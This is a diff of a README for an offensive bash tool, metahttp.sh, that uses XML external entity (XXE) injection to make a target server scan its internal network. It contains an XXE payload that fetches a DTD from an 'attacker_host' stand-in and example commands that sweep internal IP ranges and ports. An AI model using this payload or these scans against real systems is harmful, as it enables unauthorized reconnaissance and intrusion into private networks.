@@ -10,7 +10,7 @@ A bash script that automates the scanning of a target network for HTTP resources
 
 Initially the script waits for the target application to load the DTDs from the HTTP server it hosts.
 
-Next the attacker triggers the XXE on the target server by submitting for example the following XML:
+Next the attacker triggers the XXE on the target server by submitting for example the following XML data:
 ```xml
 <!DOCTYPE r SYSTEM "http://attacker_host/serveme.dtd"><r></r>
 ```
@@ -36,9 +36,9 @@ Finally it is noted that the script currently depends on the underlying XML pars
 ./metahttp.sh -T <(echo dockerhost) -p 80 -x ./dispatcher_examples/docker_java.sh -a /
 ```
 
-2. Scanning the internal network of a target:
+2. Scanning the internal network of a target for a server hosting the resource /path/unique/to/a/service:
 ```bash
-./metahttp.sh -t 10.10.0.0/24,10.20.0.0-10.20.0.15 -p 80,8000-8080,8983 -x ./dispatcher_examples/target_curl.sh -a /path/to/a/unique/resource
+./metahttp.sh -t 10.10.0.0/24,10.20.0.0-10.20.0.15 -p 80,8000-8080,8983 -x ./dispatcher_examples/target_curl.sh -a /path/unique/to/a/service
 ```
 
 3. More information on the options
